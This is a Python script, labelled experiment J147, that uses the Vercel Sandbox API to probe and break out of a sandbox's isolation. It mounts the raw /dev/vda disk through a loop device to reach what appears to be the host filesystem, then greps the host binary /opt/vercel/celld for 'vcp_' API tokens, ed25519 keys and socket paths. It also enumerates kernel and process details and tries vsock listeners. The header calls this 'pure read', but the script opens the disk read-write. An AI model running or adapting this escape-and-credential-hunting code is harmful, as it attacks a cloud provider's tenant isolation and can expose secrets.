# 实验J147: 进程树修复枚举 + proc/cmdline + dmesg + celld vsock上下文 + vda小读测试
# j146: celld大量vsock引用(宿主通信机制); vda大块读被杀(需小读测试); 进程枚举bug修复
# 零破坏: 纯读
import json, time, urllib.request, urllib.error, sys
try:
    sys.stdout.reconfigure(encoding='utf-8', errors='replace')
except Exception:
    pass

TOKEN = "vcp_REDACTED_PLACEHOLDER"
TEAM = "team_GIy1SZ444lspqeNbh4r8uAUg"
PROJ = "prj_iyw2xfjP3RKPT7n8b8c1tBIxxK5F"

def api(method, path, body=None, timeout=300):
    req = urllib.request.Request(f"https://api.vercel.com{path}", method=method)
    req.add_header("Authorization", f"Bearer {TOKEN}")
    req.add_header("Content-Type", "application/json")
    data = json.dumps(body).encode() if body is not None else None
    try:
        with urllib.request.urlopen(req, data=data, timeout=timeout) as r:
            return r.status, r.read().decode()
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode()[:600]
    except Exception as e:
        return -1, f"EXC {type(e).__name__}: {e}"

def run_cmd(sid, code, label, wait=True, timeout=280):
    body = {"command": "python3", "args": ["-c", code],
            "wait": wait, "logs": True, "timeout": timeout}
    for attempt in range(4):
        c, r = api("POST", f"/v2/sandboxes/sessions/{sid}/cmd?teamId={TEAM}", body)
        if c == 200:
            break
        print(f"  retry[{attempt}] status {c}: {r[:150]}", flush=True)
        time.sleep(3)
    print(f"=== cmd[{label}] status {c} ===", flush=True)
    if c != 200:
        print(f"  RAW: {r[:400]}", flush=True)
        return ""
    for line in r.splitlines():
        line = line.strip()
        if not line:
            continue
        try:
            d = json.loads(line)
            if d.get("stream") in ("stdout", "stderr"):
                print(d.get("data", ""), end="", flush=True)
            elif d.get("stream") == "command":
                print("\nEXIT:", d.get("command", {}).get("exitCode"), flush=True)
        except Exception:
            print(line[:400], flush=True)
    return ""

def catfile(sid, path, label, n=16000):
    c, r = api("POST", f"/v2/sandboxes/sessions/{sid}/cmd?teamId={TEAM}",
               {"command": "cat", "args": [path], "wait": True, "logs": True, "timeout": 100})
    print(f"=== {label} status {c} ===", flush=True)
    print(r[:n], flush=True)

NAME = "expj147"
api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
c, r = api("POST", f"/v2/sandboxes?teamId={TEAM}",
           {"projectId": PROJ, "name": NAME,
            "networkPolicy": {"mode": "custom", "allowedDomains": ["httpbin.org"]}})
print("create:", c)
sid = json.loads(r)["sandbox"]["currentSessionId"]
print("sid:", sid)

# cmdA: 进程树(修复) + cmdline + dmesg + kallsyms
CA = r'''
import os, subprocess
out = open("/tmp/d147a.txt", "w")
def p(*a):
    out.write(" ".join(str(x) for x in a) + "\n")
    out.flush()
def sh(cmd, t=10):
    try:
        r = subprocess.run(cmd, shell=True, capture_output=True, timeout=t)
        return (r.stdout or b"").decode("latin1", "replace") + (r.stderr or b"").decode("latin1", "replace")
    except Exception as e:
        return "EXC %r" % (e,)
pids = sorted([d for d in os.listdir("/proc") if d.isdigit()], key=int)
p("=== ALL_PIDS ===")
p(pids)
p("=== PROCS ===")
for pid in pids:
    try:
        cl = open("/proc/%s/cmdline" % pid, "rb").read().replace(b"\x00", b" ").decode("latin1", "replace")[:130]
        st = open("/proc/%s/status" % pid).read()
        name = ""
        nspid = ""
        ppid = ""
        for l in st.splitlines():
            if l.startswith("Name:"):
                name = l.split(":", 1)[1].strip()
            elif l.startswith("NSpid:"):
                nspid = l.split(":", 1)[1].strip()
            elif l.startswith("PPid:"):
                ppid = l.split(":", 1)[1].strip()
        p(pid, "ppid=" + ppid, name, cl, "NSpid=" + nspid)
    except Exception:
        pass
p("=== CMDLINE ===")
p(sh("cat /proc/cmdline 2>&1; echo"))
p("=== DMESG_HEAD ===")
p(sh("dmesg 2>&1 | head -25"))
p("=== DMESG_VSOCK ===")
p(sh("dmesg 2>&1 | grep -iE 'vsock|virtio|vda|vdb|loop' | head -20"))
p("=== KALLSYMS ===")
p(sh("head -3 /proc/kallsyms 2>&1; grep -c ' t ' /proc/kallsyms 2>&1 | head -1"))
p("=== MODULES ===")
p(sh("cat /proc/modules 2>&1 | grep -iE 'vsock|loop' | head -10"))
p("=== DONE")
out.close()
'''

# cmdB: celld vsock上下文 + 其余grep
CB = MOUNT_CODE2 = r'''
import os, subprocess, ctypes, fcntl
libc = ctypes.CDLL(None, use_errno=True)
libc.mount.restype = ctypes.c_int
vda = os.open("/dev/vda", os.O_RDWR)
loop = os.open("/dev/loop0", os.O_RDWR)
fcntl.ioctl(loop, 0x4C00, vda)
os.makedirs("/tmp/host", exist_ok=True)
ctypes.set_errno(0)
r = libc.mount(b"/dev/loop0", b"/tmp/host", b"xfs", 1, b"nouuid,norecovery")
print("MOUNT_RC", r)
''' + r'''
import subprocess
out = open("/tmp/d147b.txt", "w")
def p(*a):
    out.write(" ".join(str(x) for x in a) + "\n")
    out.flush()
def sh(cmd, t=20):
    try:
        r = subprocess.run(cmd, shell=True, capture_output=True, timeout=t)
        return (r.stdout or b"").decode("latin1", "replace") + (r.stderr or b"").decode("latin1", "replace")
    except Exception as e:
        return "EXC %r" % (e,)
def ctx(off, n=300):
    try:
        f = open("/tmp/host/opt/vercel/celld", "rb")
        f.seek(max(0, off - n))
        return repr(f.read(2 * n))
    except Exception as e:
        return "ERR %r" % (e,)
p("=== VSOCK_CTX ===")
offs = []
try:
    for line in sh("grep -aob 'vsock' /tmp/host/opt/vercel/celld 2>/dev/null | head -12", 30).splitlines():
        try:
            offs.append(int(line.split(":")[0]))
        except Exception:
            pass
except Exception:
    pass
p("vsock offs", offs[:12])
for off in offs[:12]:
    p("VS", hex(off), ctx(off))
p("=== CELLD_SOCK_CTX ===")
for kw in ("/run/cell", "cell.sock", "init.sock", "ca-cert"):
    try:
        for line in sh("grep -aob '%s' /tmp/host/opt/vercel/celld 2>/dev/null | head -5" % kw, 30).splitlines():
            try:
                off = int(line.split(":")[0])
                p("KW", kw, hex(off), ctx(off, 200))
            except Exception:
                pass
    except Exception:
        pass
p("=== GREP_TOKEN ===")
p(sh("grep -aob 'vcp_' /tmp/host/opt/vercel/celld 2>/dev/null | head -5", 30))
p("=== GREP_ED25519 ===")
p(sh("grep -aob 'd25519' /tmp/host/opt/vercel/celld 2>/dev/null | head -5", 30))
p("=== GREP_SPAWN_CTX ===")
try:
    for line in sh("grep -aob 'Spawn' /tmp/host/opt/vercel/celld 2>/dev/null | head -8", 30).splitlines():
        try:
            off = int(line.split(":")[0])
            p("SPAWN", hex(off), ctx(off, 200))
        except Exception:
            pass
except Exception:
    pass
p("=== DONE")
out.close()
'''

# cmdC: vda 小读测试 (8MB块, 读1GB) + loop读测试
CC = r'''
import os, time
out = open("/tmp/d147c.txt", "w")
def p(*a):
    out.write(" ".join(str(x) for x in a) + "\n")
    out.flush()
p("=== VDA_SMALL_READ ===")
f = open("/dev/vda", "rb")
t0 = time.time()
total = 0
CH = 8 * 1024 * 1024
pos = 0
while total < 1024 * 1024 * 1024:
    try:
        f.seek(pos)
        chunk = f.read(CH)
    except Exception as e:
        p("ERR", hex(pos), repr(e)[:60])
        pos += CH
        continue
    if not chunk:
        break
    pos += len(chunk)
    total += len(chunk)
f.close()
p("vda read MB", total // (1024 * 1024), "elapsed", int(time.time() - t0), "MBps", int(total / max(1, time.time() - t0) / (1024 * 1024)))
p("=== LOOP0_READ ===")
try:
    f = open("/dev/loop0", "rb")
    t0 = time.time()
    f.seek(1024 * 1024)
    d = f.read(8 * 1024 * 1024)
    f.close()
    p("loop0 read ok", len(d), "MBps", int(len(d) / max(0.001, time.time() - t0) / (1024 * 1024)))
except Exception as e:
    p("loop0 err", repr(e))
p("=== DONE")
out.close()
'''

# cmdD: vsock 细节 + sysfs
CD = r'''
import os, subprocess, socket
out = open("/tmp/d147d.txt", "w")
def p(*a):
    out.write(" ".join(str(x) for x in a) + "\n")
    out.flush()
def sh(cmd, t=10):
    try:
        r = subprocess.run(cmd, shell=True, capture_output=True, timeout=t)
        return (r.stdout or b"").decode("latin1", "replace") + (r.stderr or b"").decode("latin1", "replace")
    except Exception as e:
        return "EXC %r" % (e,)
p("=== SYS_VSOCK ===")
p(sh("ls -la /sys/class/vsock/ 2>&1; ls -la /sys/class/vsock/vsock/ 2>&1; cat /sys/class/vsock/vsock/* 2>&1 | head -20", 10))
p("=== VSOCK_CID ===")
p(sh("cat /sys/class/vsock/vsock/guest_cid 2>&1", 10))
p("=== PROBE_AGAIN ===")
AF_VSOCK = 40
for cid, port in [(2, 12345), (2, 9000), (4294967295, 9999)]:
    try:
        s = socket.socket(AF_VSOCK, socket.SOCK_STREAM)
        s.settimeout(2)
        s.bind((4294967295, 9999))
        s.listen(1)
        p("bind listen ok for", cid, port)
        try:
            c, a = s.accept()
            p("ACCEPT", a)
            c.close()
        except Exception as e:
            p("accept err", repr(e)[:80])
        s.close()
        break
    except Exception as e:
        p("bind err", repr(e)[:100])
p("=== DONE")
out.close()
'''

run_cmd(sid, CA, "procs", timeout=120)
catfile(sid, "/tmp/d147a.txt", "d147a", 9000)

run_cmd(sid, CB, "celld-ctx", timeout=200)
catfile(sid, "/tmp/d147b.txt", "d147b", 12000)

run_cmd(sid, CC, "small-read", timeout=200)
catfile(sid, "/tmp/d147c.txt", "d147c", 3000)

run_cmd(sid, CD, "vsock-detail", timeout=100)
catfile(sid, "/tmp/d147d.txt", "d147d", 3000)

api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
print("\ncleanup done", flush=True)
